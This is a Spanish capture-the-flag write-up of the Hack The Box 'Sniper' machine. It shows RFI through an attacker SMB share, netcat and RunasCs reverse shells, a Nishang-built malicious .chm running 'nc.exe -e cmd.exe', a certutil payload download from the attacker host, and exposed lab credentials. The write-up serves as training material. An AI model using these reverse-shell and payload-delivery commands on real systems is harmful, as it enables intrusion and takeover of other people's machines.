---
tags:
title: Sniper - Medium (HTB)
permalink: /Sniper-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
 nmap -sCV -p80,135,139,445,49667 10.129.229.6                            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-15 18:53 EST
Nmap scan report for 10.129.229.6
Host is up (0.63s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Sniper Co.
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-16T06:56:03
|_  start_date: N/A
|_clock-skew: 7h01m23s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.29 seconds
```

## Website 

La pagina principal me muestra algunos mensajes.

![[Pasted image 20251215205349.png]]
## Shell as iusr
### LFI

Si hago `hovering` sobre `Our services` veo que me lleva a `/blog?lang=<archivo>.php` por lo que interceptando la petición con `Burpsuite` probé un payload para ver el `/etc/hosts` y funciono.

![[Pasted image 20251215210359.png]]
### RFI

Comúnmente cuando se detectan LFI derivan muchas veces en un `RFI (Remote File Inclusion)` de manera que puedo aprovecharme del la vulnerabilidad para poder aputar a mi archivo `php` localmente y asi poder ejecutar código, primero me cree un servidor `smb` con el siguiente comando.

```bash
impacket-smbserver -smb2support share $(pwd)
```

Y desde la web apunte a el usando 

```bash
\\10.10.10.x\share\shell.php&cmd=whoami
```

![[Pasted image 20251215224835.png]]

Y es así como vi que el output me devolvió que el usuario `iusr` es el que estaba por detrás de la pagina. Por  lo que me envié una revshell de `Powershell` en `base64`

Y desde mi listener recibo la conexion.

```powershell
 rlwrap -cAr nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.229.6] 49767
whoami
nt authority\iusr
PS C:\inetpub\wwwroot\blog> 
```
## Shell as chris

Como no puedo ver la flag la cual esta dentro del directorio del usuario `chris` seguí enumerando, y es así donde en un archivo `.php`, encontré la siguiente credenciales.
## Credentials

```bash
PS C:\inetpub\wwwroot\user> cat db.php
<?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?>
```

Antes de conectarme a la base de datos, probé hacer uso de [RunasCS.exe](https://github.com/antonioCoco/RunasCs) para poder intentar si las mismas eran validas para el usuario `chris` por lo que use el siguiente comando del binario, para poder establecer una `cmd.exe` pero que el flujo vaya a la `ip` dada y el `puerto` dado.

```powershell
PS C:\programdata> .\RunasCs.exe chris '36mEAhz/B8xQ~2VM' cmd.exe -r 10.10.17.19:4444

[+] Running in session 0 with process function CreateProcessWithTokenW()
[+] Using Station\Desktop: Service-0x0-3e3$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 2496 created in background.
```

Y desde mi listener recibí la conexión como el usuario.

```powershell
rlwrap -cAr nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.229.6] 49773
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
sniper\chris
```

```powershell
c:\Users\Chris\Desktop>type user.txt
type user.txt
4fa46ac994ade273d1263832e281434e
```
## Shell as administrator

Enumerando, veo que hay un directorio en la raíz, con una nota que dice lo siguiente.

```powershell
PS C:\docs> cat note.txt
cat note.txt
Hi Chris,
        Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.

Regards,
Sniper CEO.
```

Al parecer habla entre otras cosas, que el usuario `administrator` esta a la espera de una documentación que el usuario `chris` debe entregar.
Además veo que el directorio `downloads` de chris hay un archivo, el cual parece ser un archivo `chm`, con la extensión que al parecer que es la que requiere o espera el usuario `Administrator`.

>Un archivo `.chm` es un archivo de Ayuda HTML Compilada de Microsoft, un formato que agrupa páginas HTML, imágenes y otros recursos en un solo archivo para crear manuales de ayuda y documentación para aplicaciones de Windows
## Malicious .chm

En el repo de [Nishang](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1) encontré este archivo el cual me genera automáticamente un archivo `.chm` con el payload que desee. Para la creación del mismo baje el propio script a mi maquina `Windows` e importe el modulo con el siguiente comando.

```powershell
Import-Module C:\Users\yo\Out-CHM.ps1
```

Como en mi caso obtuve errores para poder ejecutar el script debido a que no pude importar correctamente el comando, use el siguiente comando.

```powershell
Set-ExecutionPolicy Unrestricted
```

Le di a `S` o `Y` en caso del que este en ingles y de ahí ya pude importarlo.
Ahora el comando que ejecute es el siguiente.

```powershell
Out-CHM -Payload "C:\programdata\nc.exe 10.10.17.19 4444 -e cmd.exe" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
```

El mismo se encarga de que cuando el usuario `Administrator` lea o abra el archivo, me envié una shell desde la que voy estar en espera de la conexión.

Solo me quedo subir el archivo a mi maquina `linux`, y de ahí a la maquina victima con `certutil` con el nombre del archivo de ejemplo `(instructions.chm)`, con el siguiente comando.

```powershell
certutil -urlcache -split -f http://10.10.17.19/doc.chm C:\Docs\intructions.chm
```

De ahí solo me quedo esperar unos segundos y después recibí mi shell como el usuario `Administrator`

```powershell
 rlwrap -cAr nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.229.6] 49799
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
sniper\administrator
```

```powershell
PS C:\Users\Administrator\Desktop> cat root.txt
cat root.txt
88952d49a1142cc00c0239ae12d40801
```

`~Happy Hacking`